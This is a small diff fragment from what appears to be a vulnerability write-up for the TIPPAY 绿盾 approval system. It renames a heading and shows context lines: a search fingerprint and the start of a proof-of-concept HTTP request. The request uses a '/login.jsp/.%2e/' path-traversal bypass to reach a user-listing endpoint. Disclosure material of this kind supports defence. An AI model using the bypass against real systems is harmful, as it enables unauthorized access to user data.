@@ -16,7 +16,7 @@ V7.05.240904
 app="TIPPAY-绿盾审批系统"
 ```
 
-## poc
+## POC
 ```
 POST /trwfe/login.jsp/.%2e/user/findUserPageExcludeCurrentUser.do HTTP/1.1
 Host: trwfe.mrxn.net
